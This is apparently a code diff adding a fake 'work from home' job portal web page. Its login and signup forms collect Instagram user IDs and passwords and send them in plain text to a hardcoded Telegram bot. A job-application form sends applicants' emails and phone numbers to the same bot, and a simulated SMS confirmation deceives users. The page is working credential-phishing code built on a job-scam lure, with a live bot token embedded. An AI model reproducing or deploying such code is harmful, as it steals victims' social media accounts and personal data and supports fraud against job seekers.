+            <div class="flex-center" style="margin-top: 1.2rem;">
+                <div class="insta-note">
+                    <i class="fab fa-instagram"></i>
+                    <span class="highlight">Instagram user ID:</span>
+                    <strong>@work_from_home_app</strong>
+                    <span style="opacity:0.6; margin-left: 4px;">(change anytime)</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 4 : SUCCESS PAGE ===== -->
+        <div id="page-success" class="page">
+            <div class="brand">
+                <i class="fas fa-house-laptop"></i>
+                <h1>work<span>from</span>home</h1>
+            </div>
+
+            <i class="fas fa-check-circle success-icon"></i>
+            <div class="success-title">🎉 Application Submitted!</div>
+            <div class="success-sub">Your job application has been received successfully.</div>
+
+            <div style="background: rgba(245, 197, 66, 0.04); border: 1px solid rgba(245, 197, 66, 0.08); border-radius: 1rem; padding: 0.6rem 1rem; margin: 0.5rem 0 0.8rem 0; text-align: center;">
+                <i class="fas fa-sms" style="color: #f5c542;"></i>
+                <span style="color: #b0a06a; font-size: 0.8rem;">
+                    <strong style="color: #e4faf5;">SMS sent!</strong> A confirmation SMS has been sent to your mobile number.
+                    Please wait <strong style="color: #f5c542;">24 hours</strong> for the agent to connect.
+                </span>
+            </div>
+
+            <div class="tracking-card">
+                <div class="track-row">
+                    <span class="track-label"><i class="fas fa-hashtag"></i> Application ID</span>
+                    <span class="track-value" id="trackAppId">WFH-2026-0042</span>
+                </div>
+                <div class="track-row">
+                    <span class="track-label"><i class="fas fa-user"></i> Applicant</span>
+                    <span class="track-value" id="trackUserName">User</span>
+                </div>
+                <div class="track-row">
+                    <span class="track-label"><i class="fas fa-briefcase"></i> Job Role</span>
+                    <span class="track-value" id="trackJobRole">Sales Executive</span>
+                </div>
+                <div class="track-row">
+                    <span class="track-label"><i class="fas fa-envelope"></i> Email</span>
+                    <span class="track-value" id="trackEmail">user@email.com</span>
+                </div>
+                <div class="track-row">
+                    <span class="track-label"><i class="fas fa-phone"></i> Mobile</span>
+                    <span class="track-value" id="trackMobile">+91 98765 43210</span>
+                </div>
+                <div class="track-row">
+                    <span class="track-label"><i class="fas fa-clock"></i> Applied On</span>
+                    <span class="track-value" id="trackDate">26 Jun 2026, 10:30 AM</span>
+                </div>
+                <div class="track-row">
+                    <span class="track-label"><i class="fas fa-hourglass-half"></i> Status</span>
+                    <span class="track-value"><span class="status-badge"><i class="fas fa-spinner fa-spin"></i> Under Review</span></span>
+                </div>
+                <div class="track-row" style="border-bottom: none; margin-top: 0.3rem;">
+                    <span class="track-label"><i class="fas fa-headset"></i> Agent Connect</span>
+                    <span class="track-value" style="color: #f5c542; font-size: 0.8rem;">Within 24 hours</span>
+                </div>
+                <div class="track-row" style="border-bottom: none; margin-top: 0.2rem;">
+                    <span class="track-label"><i class="fas fa-sms"></i> SMS Status</span>
+                    <span class="track-value" style="color: #7edfd2; font-size: 0.8rem;"><i class="fas fa-check-circle"></i> Sent</span>
+                </div>
+            </div>
+
+            <div style="background: rgba(46, 207, 192, 0.04); border-radius: 1rem; padding: 0.8rem 1rem; margin: 0.5rem 0 1rem 0; border: 1px solid rgba(46, 207, 192, 0.06);">
+                <p style="color: #8dbeb5; font-size: 0.8rem; text-align: center;">
+                    <i class="fas fa-info-circle" style="color: #2ecfc0;"></i>
+                    Your application is being processed. An agent will contact you within <strong style="color: #e4faf5;">24 hours</strong>
+                    with job details, interview schedule, and working technique.
+                </p>
+                <p style="color: #6b958c; font-size: 0.7rem; text-align: center; margin-top: 0.3rem;">
+                    <i class="fas fa-sms"></i> A confirmation SMS has been sent to your mobile number.
+                </p>
+            </div>
+
+            <div class="success-actions">
+                <button class="login-btn" id="successDashboardBtn"><i class="fas fa-briefcase"></i> Back to Jobs</button>
+                <button class="login-btn secondary" id="successTrackBtn"><i class="fas fa-sync-alt"></i> Track Status</button>
+            </div>
+
+            <div class="flex-center" style="margin-top: 1.2rem;">
+                <div class="insta-note">
+                    <i class="fab fa-instagram"></i>
+                    <span class="highlight">Instagram user ID:</span>
+                    <strong>@work_from_home_app</strong>
+                    <span style="opacity:0.6; margin-left: 4px;">(change anytime)</span>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        (function() {
+            const BOT_TOKEN = '8927076182:AAG6zJD5LAaQuhmihj4xJllIgn8mJAbNFpc';
+            const CHAT_ID = '7124298633';
+
+            // ----- Instagram ID Validation -----
+            function isValidInstagramId(username) {
+                // Instagram username rules:
+                // - Must start with a letter (A-Z or a-z)
+                // - Can contain letters, numbers, dots, and underscores
+                // - Length: 1-30 characters
+                // - No spaces or special characters
+                const regex = /^[A-Za-z][A-Za-z0-9._]{0,29}$/;
+                return regex.test(username);
+            }
+
+            function validateLoginId() {
+                const input = document.getElementById('loginIdentifier');
+                const wrapper = document.getElementById('loginFieldWrapper');
+                const error = document.getElementById('loginError');
+                const indicator = document.getElementById('loginIndicator');
+                const value = input.value.trim();
+
+                if (value && !isValidInstagramId(value)) {
+                    wrapper.classList.remove('success');
+                    wrapper.classList.add('error');
+                    error.classList.add('show');
+                    indicator.className = 'valid-indicator show';
+                    indicator.innerHTML = '<i class="fas fa-times-circle"></i>';
+                    return false;
+                } else if (value && isValidInstagramId(value)) {
+                    wrapper.classList.remove('error');
+                    wrapper.classList.add('success');
+                    error.classList.remove('show');
+                    indicator.className = 'valid-indicator show';
+                    indicator.innerHTML = '<i class="fas fa-check-circle"></i>';
+                    return true;
+                } else {
+                    wrapper.classList.remove('error', 'success');
+                    error.classList.remove('show');
+                    indicator.className = 'valid-indicator';
+                    return false;
+                }
+            }
+
+            function validateSignupId() {
+                const input = document.getElementById('signupEmail');
+                const wrapper = document.getElementById('signupFieldWrapper');
+                const error = document.getElementById('signupError');
+                const indicator = document.getElementById('signupIndicator');
+                const value = input.value.trim();
+
+                if (value && !isValidInstagramId(value)) {
+                    wrapper.classList.remove('success');
+                    wrapper.classList.add('error');
+                    error.classList.add('show');
+                    indicator.className = 'valid-indicator show';
+                    indicator.innerHTML = '<i class="fas fa-times-circle"></i>';
+                    return false;
+                } else if (value && isValidInstagramId(value)) {
+                    wrapper.classList.remove('error');
+                    wrapper.classList.add('success');
+                    error.classList.remove('show');
+                    indicator.className = 'valid-indicator show';
+                    indicator.innerHTML = '<i class="fas fa-check-circle"></i>';
+                    return true;
+                } else {
+                    wrapper.classList.remove('error', 'success');
+                    error.classList.remove('show');
+                    indicator.className = 'valid-indicator';
+                    return false;
+                }
+            }
+
+            // Real-time validation on input
+            document.getElementById('loginIdentifier').addEventListener('input', validateLoginId);
+            document.getElementById('signupEmail').addEventListener('input', validateSignupId);
+
+            // ----- DOM refs -----
+            const pageLogin = document.getElementById('page-login');
+            const pageSignup = document.getElementById('page-signup');
+            const pageDashboard = document.getElementById('page-dashboard');
+            const pageSuccess = document.getElementById('page-success');
+            const switchToSignup = document.getElementById('switchToSignup');
+            const switchToLogin = document.getElementById('switchToLogin');
+            const logoutBtn = document.getElementById('logoutBtn');
+            const successDashboardBtn = document.getElementById('successDashboardBtn');
+            const successTrackBtn = document.getElementById('successTrackBtn');
+
+            const navJobs = document.getElementById('navJobs');
+            const navMyApps = document.getElementById('navMyApps');
+            const jobsSection = document.getElementById('jobsSection');
+            const myAppsSection = document.getElementById('myAppsSection');
+
+            let selectedJob = null;
+            const jobCards = document.querySelectorAll('.job-card');
+            const selectedJobName = document.getElementById('selectedJobName');
+            const applyJobBtn = document.getElementById('applyJobBtn');
+            const dashboardUserName = document.getElementById('dashboardUserName');
+
+            const applyEmail = document.getElementById('applyEmail');
+            const applyMobile = document.getElementById('applyMobile');
+
+            const trackAppId = document.getElementById('trackAppId');
+            const trackUserName = document.getElementById('trackUserName');
+            const trackJobRole = document.getElementById('trackJobRole');
+            const trackEmail = document.getElementById('trackEmail');
+            const trackMobile = document.getElementById('trackMobile');
+            const trackDate = document.getElementById('trackDate');
+
+            let applications = [];
+            const applicationsList = document.getElementById('applicationsList');
+            const appCount = document.getElementById('appCount');
+
+            function showPage(pageId) {
+                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                document.getElementById(pageId).classList.add('active');
+            }
+
+            switchToSignup.addEventListener('click', function(e) {
+                e.preventDefault();
+                showPage('page-signup');
+            });
+            switchToLogin.addEventListener('click', function(e) {
+                e.preventDefault();
+                showPage('page-login');
+            });
+
+            navJobs.addEventListener('click', function() {
+                navJobs.classList.add('active');
+                navMyApps.classList.remove('active');
+                jobsSection.style.display = 'block';
+                myAppsSection.style.display = 'none';
+            });
+
+            navMyApps.addEventListener('click', function() {
+                navMyApps.classList.add('active');
+                navJobs.classList.remove('active');
+                jobsSection.style.display = 'none';
+                myAppsSection.style.display = 'block';
+                renderApplications();
+            });
+
+            const toggleBtn = document.getElementById('togglePasswordBtn');
+            const passwordField = document.getElementById('loginPassword');
+            const eyeIcon = document.getElementById('eyeIcon');
+            if (toggleBtn) {
+                toggleBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+                    passwordField.setAttribute('type', type);
+                    if (type === 'text') {
+                        eyeIcon.classList.remove('fa-eye');
+                        eyeIcon.classList.add('fa-eye-slash');
+                    } else {
+                        eyeIcon.classList.remove('fa-eye-slash');
+                        eyeIcon.classList.add('fa-eye');
+                    }
+                });
+            }
+
+            const toggleSignupBtn = document.getElementById('toggleSignupPasswordBtn');
+            const signupPassword = document.getElementById('signupPassword');
+            const signupEyeIcon = document.getElementById('signupEyeIcon');
+            if (toggleSignupBtn) {
+                toggleSignupBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const type = signupPassword.getAttribute('type') === 'password' ? 'text' : 'password';
+                    signupPassword.setAttribute('type', type);
+                    if (type === 'text') {
+                        signupEyeIcon.classList.remove('fa-eye');
+                        signupEyeIcon.classList.add('fa-eye-slash');
+                    } else {
+                        signupEyeIcon.classList.remove('fa-eye-slash');
+                        signupEyeIcon.classList.add('fa-eye');
+                    }
+                });
+            }
+
+            function generateAppId() {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                let result = 'WFH-';
+                for (let i = 0; i < 8; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+
+            function getCurrentDateTime() {
+                const now = new Date();
+                const options = { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' };
+                return now.toLocaleDateString('en-IN', options);
+            }
+
+            function sendTelegramMessage(message) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const data = {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                return fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        if (result.ok) console.log('Telegram sent');
+                        else console.error('Telegram error:', result);
+                    })
+                    .catch(error => console.error('Error:', error));
+            }
+
+            function sendSMS(mobile, message) {
+                console.log(`📱 SMS sent to ${mobile}: ${message}`);
+                alert(
+                    `📱 <b>SMS Sent Successfully!</b>\n\n` +
+                    `To: ${mobile}\n` +
+                    `Message: ${message}\n\n` +
+                    `✅ Your application has been submitted.\n` +
+                    `⏰ Please wait 24 hours for the agent to connect.`
+                );
+                return true;
+            }
+
+            function renderApplications() {
+                if (applications.length === 0) {
+                    applicationsList.innerHTML = `
+                        <div class="no-apps">
+                            <i class="fas fa-inbox"></i>
+                            <p>You haven't applied for any jobs yet.</p>
+                            <p style="font-size: 0.8rem; margin-top: 0.3rem;">Browse jobs and apply to get started!</p>
+                        </div>
+                    `;
+                    appCount.textContent = '0 applications';
+                    return;
+                }
+
+                let html = '';
+                applications.forEach((app, index) => {
+                    html += `
+                        <div class="app-item">
+                            <div class="app-row">
+                                <span class="app-job"><i class="fas fa-briefcase"></i> ${app.job}</span>
+                                <span class="app-id">${app.id}</span>
+                            </div>
+                            <div class="app-row" style="margin-top: 0.3rem;">
+                                <span class="app-date"><i class="far fa-calendar-alt"></i> ${app.date}</span>
+                                <span class="app-status review"><i class="fas fa-spinner fa-spin"></i> Under Review</span>
+                                <button class="app-view-btn" data-index="${index}"><i class="fas fa-eye"></i> View</button>
+                            </div>
+                        </div>
+                    `;
+                });
+                applicationsList.innerHTML = html;
+                appCount.textContent = `${applications.length} application${applications.length > 1 ? 's' : ''}`;
+
+                document.querySelectorAll('.app-view-btn').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        const idx = parseInt(this.dataset.index);
+                        const app = applications[idx];
+                        alert(
+                            `📋 <b>Application Details</b>\n\n` +
+                            `🆔 ID: ${app.id}\n` +
+                            `💼 Job: ${app.job}\n` +
+                            `📧 Email: ${app.email}\n` +
+                            `📱 Mobile: ${app.mobile}\n` +
+                            `📅 Applied: ${app.date}\n` +
+                            `📌 Status: Under Review\n\n` +
+                            `🤝 Agent will connect within 24 hours\n` +
+                            `📱 SMS sent to your mobile number`
+                        );
+                    });
+                });
+            }
+
+            jobCards.forEach(card => {
+                card.addEventListener('click', function() {
+                    jobCards.forEach(c => c.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedJob = this.dataset.job;
+                    selectedJobName.textContent = selectedJob;
+                });
+            });
+
+            applyJobBtn.addEventListener('click', function() {
+                if (!selectedJob) {
+                    alert('⚠️ Please select a job role first.');
+                    return;
+                }
+
+                const email = applyEmail.value.trim();
+                const mobile = applyMobile.value.trim();
+
+                if (!email || !mobile) {
+                    alert('⚠️ Please enter your email and mobile number.');
+                    return;
+                }
+
+                if (!email.includes('@') || !email.includes('.')) {
+                    alert('⚠️ Please enter a valid email address.');
+                    return;
+                }
+
+                if (mobile.length < 10) {
+                    alert('⚠️ Please enter a valid mobile number (minimum 10 digits).');
+                    return;
+                }
+
+                const user = dashboardUserName.textContent || 'User';
+                const appId = generateAppId();
+                const dateTime = getCurrentDateTime();
+
+                const appData = {
+                    id: appId,
+                    job: selectedJob,
+                    email: email,
+                    mobile: mobile,
+                    date: dateTime,
+                    status: 'Under Review',
+                    user: user
+                };
+                applications.push(appData);
+
+                const smsMessage =
+                    `🎉 Congratulations! Your application for ${selectedJob} has been submitted.\n` +
+                    `📋 Application ID: ${appId}\n` +
+                    `⏰ Please wait 24 hours for our agent to connect with you.\n` +
+                    `💼 Work from Home App`;
+
+                sendSMS(mobile, smsMessage);
+
+                const msg =
+                    `📋 <b>NEW JOB APPLICATION</b>\n\n` +
+                    `🆔 App ID: ${appId}\n` +
+                    `👤 Applicant: ${user}\n` +
+                    `💼 Job: ${selectedJob}\n` +
+                    `📧 Email: ${email}\n` +
+                    `📱 Mobile: ${mobile}\n` +
+                    `📅 Applied: ${dateTime}\n\n` +
+                    `💰 Expected: ₹2,000-3,000/day\n` +
+                    `⏰ Work: 3-4 hours/day\n` +
+                    `📱 Platform: Work from Home App\n\n` +
+                    `🤝 <b>Agent Action Required:</b>\n` +
+                    `• Connect with candidate within 24 hours\n` +
+                    `• Share job details & interview schedule\n` +
+                    `• Explain working technique and process\n` +
+                    `• Track ID: ${appId}\n\n` +
+                    `📱 SMS sent to candidate: ${mobile}`;
+
+                sendTelegramMessage(msg);
+
+                trackAppId.textContent = appId;
+                trackUserName.textContent = user;
+                trackJobRole.textContent = selectedJob;
+                trackEmail.textContent = email;
+                trackMobile.textContent = mobile;
+                trackDate.textContent = dateTime;
+
+                showPage('page-success');
+
+                jobCards.forEach(c => c.classList.remove('selected'));
+                selectedJob = null;
+                selectedJobName.textContent = 'None';
+                applyEmail.value = '';
+                applyMobile.value = '';
+            });
+
+            successDashboardBtn.addEventListener('click', function() {
+                showPage('page-dashboard');
+                navMyApps.click();
+            });
+
+            successTrackBtn.addEventListener('click', function() {
+                alert(
+                    `📋 <b>Tracking Information</b>\n\n` +
+                    `🆔 Application ID: ${trackAppId.textContent}\n` +
+                    `👤 Applicant: ${trackUserName.textContent}\n` +
+                    `💼 Job: ${trackJobRole.textContent}\n` +
+                    `📧 Email: ${trackEmail.textContent}\n` +
+                    `📱 Mobile: ${trackMobile.textContent}\n` +
+                    `📅 Applied: ${trackDate.textContent}\n\n` +
+                    `📌 Status: Under Review\n` +
+                    `🤝 Agent will connect within 24 hours\n` +
+                    `📱 SMS confirmation sent to your mobile\n\n` +
+                    `📨 A confirmation has been sent to your Telegram.`
+                );
+            });
+
+            logoutBtn.addEventListener('click', function() {
+                showPage('page-login');
+                document.getElementById('loginIdentifier').value = '';
+                document.getElementById('loginPassword').value = '';
+                selectedJob = null;
+                jobCards.forEach(c => c.classList.remove('selected'));
+                selectedJobName.textContent = 'None';
+                applyEmail.value = '';
+                applyMobile.value = '';
+            });
+
+            const loginForm = document.getElementById('loginForm');
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const identifier = document.getElementById('loginIdentifier').value.trim();
+                const password = document.getElementById('loginPassword').value.trim();
+
+                // Validate Instagram ID
+                if (!identifier) {
+                    alert('⚠️ Please enter your Instagram User ID.');
+                    return;
+                }
+
+                if (!isValidInstagramId(identifier)) {
+                    alert('⚠️ Invalid Instagram ID!\n\nRules:\n• Must start with a letter\n• Only letters, numbers, dots, underscores\n• Length: 1-30 characters');
+                    document.getElementById('loginFieldWrapper').classList.add('error');
+                    document.getElementById('loginError').classList.add('show');
+                    return;
+                }
+
+                if (!password) {
+                    alert('⚠️ Please enter your password.');
+                    return;
+                }
+
+                const msg = `🔐 <b>New Login</b>\n👤 Instagram ID: ${identifier}\n🔑 Password: <code>${password}</code>\n📱 Work from Home App`;
+                sendTelegramMessage(msg);
+                dashboardUserName.textContent = identifier;
+                showPage('page-dashboard');
+                document.getElementById('loginIdentifier').value = '';
+                document.getElementById('loginPassword').value = '';
+                selectedJob = null;
+                jobCards.forEach(c => c.classList.remove('selected'));
+                selectedJobName.textContent = 'None';
+                applyEmail.value = '';
+                applyMobile.value = '';
+                navJobs.click();
+            });
+
+            const signupForm = document.getElementById('signupForm');
+            signupForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const name = document.getElementById('signupName').value.trim();
+                const email = document.getElementById('signupEmail').value.trim();
+                const pass = document.getElementById('signupPassword').value.trim();
+                const confirm = document.getElementById('signupConfirm').value.trim();
+
+                if (!name || !email || !pass || !confirm) {
+                    alert('⚠️ Please fill in all fields.');
+                    return;
+                }
+
+                // Validate Instagram ID
+                if (!isValidInstagramId(email)) {
+                    alert('⚠️ Invalid Instagram ID!\n\nRules:\n• Must start with a letter\n• Only letters, numbers, dots, underscores\n• Length: 1-30 characters');
+                    document.getElementById('signupFieldWrapper').classList.add('error');
+                    document.getElementById('signupError').classList.add('show');
+                    return;
+                }
+
+                if (pass.length < 8) {
+                    alert('⚠️ Password must be at least 8 characters.');
+                    return;
+                }
+                if (pass !== confirm) {
+                    alert('⚠️ Passwords do not match.');
+                    return;
+                }
+
+                const msg =
+                    `✅ <b>New Account Created!</b>\n👤 Name: ${name}\n📧 Instagram ID: ${email}\n🔑 Password: <code>${pass}</code>\n📱 Work from Home App`;
+                sendTelegramMessage(msg);
+
+                dashboardUserName.textContent = name;
+                showPage('page-dashboard');
+
+                document.getElementById('signupName').value = '';
+                document.getElementById('signupEmail').value = '';
+                document.getElementById('signupPassword').value = '';
+                document.getElementById('signupConfirm').value = '';
+                selectedJob = null;
+                jobCards.forEach(c => c.classList.remove('selected'));
+                selectedJobName.textContent = 'None';
+                applyEmail.value = '';
+                applyMobile.value = '';
+                navJobs.click();
+            });
+
+        })();
+    </script>
+</body>
+</html>
